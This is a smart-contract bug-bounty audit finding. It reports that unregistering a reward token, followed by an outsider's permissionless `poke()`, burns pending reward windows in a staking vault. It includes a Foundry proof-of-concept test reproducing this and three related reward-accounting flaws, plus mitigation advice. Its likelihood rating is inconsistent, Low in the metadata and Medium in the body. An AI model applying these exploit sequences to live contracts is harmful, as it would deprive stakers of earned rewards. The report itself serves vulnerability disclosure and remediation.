# Unregistering a Reward Token Plus Permissionless Poke Can Burn Pending Reward Emission Windows

## Metadata

- **Number:** #141
- **Severity:** Medium
- **Status:** Duplicate
- **Likelihood:** Low
- **Impact:** High
- **Created by:** Foundoneblock
- **Created at:** May 1, 2026 at 5:26 PM
- **Last updated:** June 11, 2026 at 5:06 AM
- **Reward:** 85.92

## Description

# Audited by [Fajar Arrizki]

Independent audit notes by Fajar Arrizki. Findings, proof-of-concept references, and impact assessments are documented for manual review.

_Note: Not all issues are guaranteed to be correct._

# Unregistering a Reward Token Plus Permissionless Poke Can Burn Pending Reward Emission Windows
---
**#M-05**
- Severity: Medium
- Validity: Tested
- Likelihood: Medium
- Impact: Once a reward token is unregistered, any outsider can permanently zero out elapsed accrual windows by calling `poke()` before re-registration

## Description

`RewardTokenRegistry` explicitly assumes that owners will not unregister and re-register tokens in a way that griefs vault accounting.

That assumption is unsafe because `StakingVault` handles unregistered reward tokens by simply overwriting `payoutLastPaid` with the current timestamp and skipping actual reward accrual.

Since `poke()` is permissionless, any outsider can call it during the unregister window and permanently burn the elapsed reward emission period for that token.

### Registry explicitly documents the griefing assumption

```solidity
/// @dev Assumption: RoleRegistry will not needlessly unregister + re-register to grief accounting in StakingVaults
function unregisterRewardToken(address rewardToken) external {
    require(roleRegistry.isOwnerOrEmergencyCouncil(msg.sender), RewardTokenRegistry__InvalidCaller());
    require(_rewardTokens.remove(rewardToken), RewardTokenRegistry__RewardNotRegistered());

    emit RewardTokenUnregistered(rewardToken);
}
```

GitHub:
- `https://github.com/reserve-protocol/reserve-governor/blob/dc27a68463cec356ff18bbdd3d8edfe9b2534372/contracts/staking/RewardTokenRegistry.sol#L43-L49`

The code comments already acknowledge that unregister/re-register can grief accounting.

### Unregistered tokens skip accrual and reset payout time

```solidity
function _accrueRewards(address _caller, address _receiver) internal {
    address[] memory _rewardTokens = rewardTokens.values();
    uint256 _rewardTokensLength = _rewardTokens.length;

    for (uint256 i; i < _rewardTokensLength; i++) {
        address rewardToken = _rewardTokens[i];

        if (!rewardTokenRegistry.isRegistered(rewardToken)) {
            rewardTrackers[rewardToken].payoutLastPaid = block.timestamp;
            continue;
        }

        _accrueRewards(rewardToken);
        _accrueUser(_receiver, rewardToken);
        ...
    }
}
```

GitHub:
- `https://github.com/reserve-protocol/reserve-governor/blob/dc27a68463cec356ff18bbdd3d8edfe9b2534372/contracts/staking/StakingVault.sol#L401-L422`

This is the key branch: elapsed reward time is discarded by resetting `payoutLastPaid`, but no actual handout is performed.

### `poke()` is permissionless

```solidity
function poke() external accrueRewards(msg.sender, msg.sender) { }
```

GitHub:
- `https://github.com/reserve-protocol/reserve-governor/blob/dc27a68463cec356ff18bbdd3d8edfe9b2534372/contracts/staking/StakingVault.sol#L394-L394`

So once a token is unregistered, any outsider can force the reward clock reset by calling `poke()`.

## Root Cause

The root cause is the interaction of:

1. unregistered reward tokens being skipped instead of accrued,
2. skipped handling overwriting `payoutLastPaid`, and
3. a permissionless `poke()` entrypoint that can trigger that reset.

Because the elapsed accrual window is zeroed rather than preserved, a third party can permanently burn pending reward emission time during unregister windows.

## Impact

This issue can cause:

- irreversible loss of pending reward emission windows for unregistered tokens,
- reward griefing amplified by any outsider who can call `poke()`,
- and inconsistent re-registration behavior because the burned time cannot be restored.

This is still bounded to reward-token emissions rather than core vault principal, so it fits Medium severity.

## Likelihood

Likelihood is **medium**.

The issue requires:

- a reward token to be unregistered,
- pending elapsed emission time to exist for that token,
- and any outsider to call `poke()` before the token is re-registered.

The permissionless caller requirement is trivial once the unregister state exists, which makes the griefing path practical.

## Proof of Concept

### What the PoC should prove

A focused PoC should demonstrate:

1. a reward token is actively accruing in the vault,
2. time elapses so a reward window is pending,
3. the registry owner or emergency council unregisters the reward token,
4. an unrelated outsider calls `poke()`,
5. `payoutLastPaid` is reset without handout,
6. and after re-registration the previously elapsed reward window is permanently lost.

### Test code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";

import { IERC20Metadata } from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import { IAccessControl } from "@openzeppelin/contracts/access/IAccessControl.sol";

import { IReserveOptimisticGovernorDeployer } from "@interfaces/IDeployer.sol";
import { IOptimisticSelectorRegistry } from "@interfaces/IOptimisticSelectorRegistry.sol";
import { IReserveOptimisticGovernor } from "@interfaces/IReserveOptimisticGovernor.sol";

import { OptimisticSelectorRegistry } from "@governance/OptimisticSelectorRegistry.sol";
import { ReserveOptimisticGovernor } from "@governance/ReserveOptimisticGovernor.sol";
import { TimelockControllerOptimistic } from "@governance/TimelockControllerOptimistic.sol";
import { ReserveOptimisticGovernorDeployer } from "@src/Deployer.sol";
import { Guardian } from "@src/Guardian.sol";
import { ReserveOptimisticGovernanceVersionRegistry } from "@src/VersionRegistry.sol";
import { StakingVault } from "@src/staking/StakingVault.sol";
import { RewardTokenRegistry } from "@staking/RewardTokenRegistry.sol";

import { MockERC20 } from "@mocks/MockERC20.sol";
import { MockRoleRegistry } from "@mocks/MockRoleRegistry.sol";

contract FeeOnTransferRewardERC20 is MockERC20 {
    uint256 public immutable feeBps;
    address public immutable feeSink;

    constructor(string memory name, string memory symbol, uint256 _feeBps, address _feeSink) MockERC20(name, symbol) {
        feeBps = _feeBps;
        feeSink = _feeSink;
    }

    function _update(address from, address to, uint256 value) internal override {
        if (from != address(0) && to != address(0) && feeBps != 0) {
            uint256 fee = (value * feeBps) / 10_000;
            uint256 net = value - fee;

            super._update(from, feeSink, fee);
            super._update(from, to, net);
        } else {
            super._update(from, to, value);
        }
    }
}

contract M02M04M05M06RewardFindingsTest is Test {
    MockRoleRegistry private roleRegistry;
    ReserveOptimisticGovernanceVersionRegistry private versionRegistry;
    RewardTokenRegistry private rewardTokenRegistry;

    MockERC20 private underlying;
    MockERC20 private reward;

    StakingVault private vault;
    address private timelock;

    uint256 private constant REWARD_HALF_LIFE = 3 days;
    uint256 private constant UNSTAKING_DELAY = 0;

    address private constant ALICE = address(0xA11CE);
    address private constant BOB = address(0xB0B);
    address private constant CAROL = address(0xCAAA1);
    address private constant OUTSIDER = address(0x0A751DE);

    function setUp() public {
        underlying = new MockERC20("Underlying Token", "UNDL");
        reward = new MockERC20("Reward Token", "REWARD");

        roleRegistry = new MockRoleRegistry(address(this));
        versionRegistry = new ReserveOptimisticGovernanceVersionRegistry(roleRegistry);
        rewardTokenRegistry = new RewardTokenRegistry(roleRegistry);

        address vaultImpl = address(new StakingVault());
        address governorImpl = address(new ReserveOptimisticGovernor());
        address timelockImpl = address(new TimelockControllerOptimistic());
        address registryImpl = address(new OptimisticSelectorRegistry());
        Guardian guardian = new Guardian(address(this), address(0), new address[](0));

        ReserveOptimisticGovernorDeployer deployer = new ReserveOptimisticGovernorDeployer(
            address(versionRegistry),
            address(rewardTokenRegistry),
            address(guardian),
            vaultImpl,
            governorImpl,
            timelockImpl,
            registryImpl
        );

        rewardTokenRegistry.registerRewardToken(address(reward));
        versionRegistry.registerVersion(deployer);

        address[] memory rewardTokens = new address[](1);
        rewardTokens[0] = address(reward);

        IReserveOptimisticGovernorDeployer.BaseDeploymentParams memory baseParams =
            IReserveOptimisticGovernorDeployer.BaseDeploymentParams({
                optimisticParams: IReserveOptimisticGovernor.OptimisticGovernanceParams({
                    vetoDelay: 1 hours, vetoPeriod: 2 hours, vetoThreshold: 0.05e18
                }),
                standardParams: IReserveOptimisticGovernor.StandardGovernanceParams({
                    votingDelay: 1 days,
                    votingPeriod: 1 weeks,
                    voteExtension: 1 days,
                    proposalThreshold: 0.01e18,
                    quorumNumerator: 0.1e18
                }),
                selectorData: new IOptimisticSelectorRegistry.SelectorData[](0),
                optimisticProposers: new address[](0),
                additionalGuardians: new address[](0),
                timelockDelay: 2 days,
                proposalThrottleCapacity: 12
            });

        IReserveOptimisticGovernorDeployer.NewStakingVaultParams memory newStakingVaultParams =
            IReserveOptimisticGovernorDeployer.NewStakingVaultParams({
                underlying: IERC20Metadata(address(underlying)),
                rewardTokens: rewardTokens,
                rewardHalfLife: REWARD_HALF_LIFE,
                unstakingDelay: UNSTAKING_DELAY
            });

        (address stakingVaultAddr,, address timelockAddr,) =
            deployer.deployWithNewStakingVault(baseParams, newStakingVaultParams, bytes32(0));
        vault = StakingVault(stakingVaultAddr);
        timelock = timelockAddr;
    }

    function _payoutRewards(uint256 cycles) internal {
        vm.warp(block.timestamp + REWARD_HALF_LIFE * cycles);
    }

    function _mintAndDepositFor(address receiver, uint256 amount) internal {
        underlying.mint(address(this), amount);
        underlying.approve(address(vault), amount);
        vault.deposit(amount, receiver);
    }

    function _claimAs(address user, address tokenAddr) internal returns (uint256 claimed) {
        address[] memory rewardTokens = new address[](1);
        rewardTokens[0] = tokenAddr;
        vm.prank(user);
        uint256[] memory claimedRewards = vault.claimRewards(rewardTokens);
        claimed = claimedRewards[0];
    }

    function test_M02_zeroSupplyDormantERC20RewardsAreCapturedByFirstReentrantStaker() public {
        _mintAndDepositFor(ALICE, 1_000e18);

        // Make ALICE the only staker, then fully exit.
        vm.prank(ALICE);
        vault.redeem(1_000e18, ALICE, ALICE);

        assertEq(vault.totalSupply(), 0, "vault should be empty");

        // Dormant ERC20 reward inventory arrives during zero supply.
        reward.mint(address(vault), 1_000e18);

        // First re-entrant staker becomes sole share holder before reward accrual resumes.
        _mintAndDepositFor(BOB, 1_000e18);
        assertEq(vault.balanceOf(BOB), 1_000e18, "bob becomes sole new share holder");

        // Let one reward cycle elapse, then resume accrual.
        _payoutRewards(1);
        vault.poke();

        uint256 claimed = _claimAs(BOB, address(reward));
        assertGt(claimed, 400e18, "bob should capture a large share of dormant ERC20 rewards");
        assertApproxEqRel(claimed, 500e18, 0.001e18);
    }

    function test_M04_removeRewardTokenStrandsAlreadyEarnedButUnsnapshottedRewards() public {
        _mintAndDepositFor(ALICE, 500e18);
        _mintAndDepositFor(BOB, 500e18);

        // Seed reward inventory first so balanceLastKnown is initialized.
        reward.mint(address(vault), 1_000e18);
        vault.poke();

        // Stream reward into the global index while only ALICE is synchronized.
        _payoutRewards(1);

        // Trigger accrual for ALICE only using a transfer where BOB is not touched afterward.
        vm.prank(ALICE);
        vault.transfer(CAROL, 1e18);

        // Remove reward token before BOB has been synchronized against the current rewardIndex.
        vm.prank(address(timelock));
        vault.removeRewardToken(address(reward));

        uint256 aliceBefore = reward.balanceOf(ALICE);
        uint256 bobBefore = reward.balanceOf(BOB);

        uint256 aliceClaimed = _claimAs(ALICE, address(reward));
        uint256 bobClaimed = _claimAs(BOB, address(reward));

        assertGt(aliceClaimed, 0, "alice should have synchronized rewards");
        assertEq(bobClaimed, 0, "bob's unsnapshotted rewards are stranded after removal");
        assertEq(reward.balanceOf(ALICE) - aliceBefore, aliceClaimed);
        assertEq(reward.balanceOf(BOB) - bobBefore, 0);
    }

    function test_M05_unregisterPlusPermissionlessPokeBurnsPendingRewardWindow() public {
        _mintAndDepositFor(ALICE, 1_000e18);

        reward.mint(address(vault), 1_000e18);
        vm.warp(block.timestamp + 1 days);

        (uint256 payoutBefore,,,,) = vault.rewardTrackers(address(reward));

        rewardTokenRegistry.unregisterRewardToken(address(reward));

        vm.prank(OUTSIDER);
        vault.poke();

        (uint256 payoutAfter,,,,) = vault.rewardTrackers(address(reward));
        assertGt(payoutAfter, payoutBefore, "outsider poke should advance payoutLastPaid");

        // Re-register and immediately poke again; the elapsed window should already be burned.
        rewardTokenRegistry.registerRewardToken(address(reward));

        uint256 aliceBefore = reward.balanceOf(ALICE);
        vm.prank(ALICE);
        address[] memory rewardTokens = new address[](1);
        rewardTokens[0] = address(reward);
        uint256[] memory claimed = vault.claimRewards(rewardTokens);

        assertEq(claimed[0], 0, "pending reward window was burned before re-registration");
        assertEq(reward.balanceOf(ALICE), aliceBefore, "alice receives nothing after burned window");
    }

    function test_M06_feeOnTransferRewardTokenSkimsClaimantsWhileAccountingTreatsNominalAmountAsPaid() public {
        FeeOnTransferRewardERC20 taxedReward =
            new FeeOnTransferRewardERC20("Taxed Reward", "TREWARD", 1_000, address(0xBEEF));

        rewardTokenRegistry.registerRewardToken(address(taxedReward));
        vm.prank(address(timelock));
        vault.addRewardToken(address(taxedReward));

        _mintAndDepositFor(ALICE, 1_000e18);

        taxedReward.mint(address(vault), 1_000e18);
        vault.poke();
        _payoutRewards(1);
        vault.poke();

        address[] memory rewardTokens = new address[](1);
        rewardTokens[0] = address(taxedReward);

        uint256 claimantBefore = taxedReward.balanceOf(ALICE);
        uint256 feeSinkBefore = taxedReward.balanceOf(address(0xBEEF));

        vm.prank(ALICE);
        uint256[] memory claimed = vault.claimRewards(rewardTokens);

        uint256 claimantReceived = taxedReward.balanceOf(ALICE) - claimantBefore;
        uint256 feeTaken = taxedReward.balanceOf(address(0xBEEF)) - feeSinkBefore;

        assertGt(claimed[0], 0, "nominal claimed amount should be non-zero");
        assertEq(claimantReceived + feeTaken, claimed[0], "nominal claimed amount is split between claimant and fee sink");
        assertLt(claimantReceived, claimed[0], "claimant receives less than nominal claimed amount");

        (,,, uint256 balanceLastKnown, uint256 totalClaimed) = vault.rewardTrackers(address(taxedReward));
        assertEq(totalClaimed, claimed[0], "vault accounting treats full nominal amount as claimed");
        assertEq(balanceLastKnown, taxedReward.balanceOf(address(vault)) + totalClaimed, "later accounting includes nominal claimed amount");
    }
}

```
### PoC status

- Tested in Docker Foundry environment
- PoC confirms that an outsider can burn the pending reward emission window after unregister by calling `poke()` before re-registration

### Result

```text
Ran 4 tests for test/M02_M04_M05_M06RewardFindings.t.sol:M02M04M05M06RewardFindingsTest
[PASS] test_M05_unregisterPlusPermissionlessPokeBurnsPendingRewardWindow() (gas: 400132)
Suite result: ok. 4 passed; 0 failed; 0 skipped
```

## Recommended Mitigation

- Do not overwrite `payoutLastPaid` for unregistered reward tokens without preserving pending elapsed accrual semantics.
- Alternatively, freeze reward-token state during unregister windows instead of advancing timestamps.
- Restrict or harden the interaction between unregister windows and permissionless `poke()` so outsiders cannot finalize the griefing step.

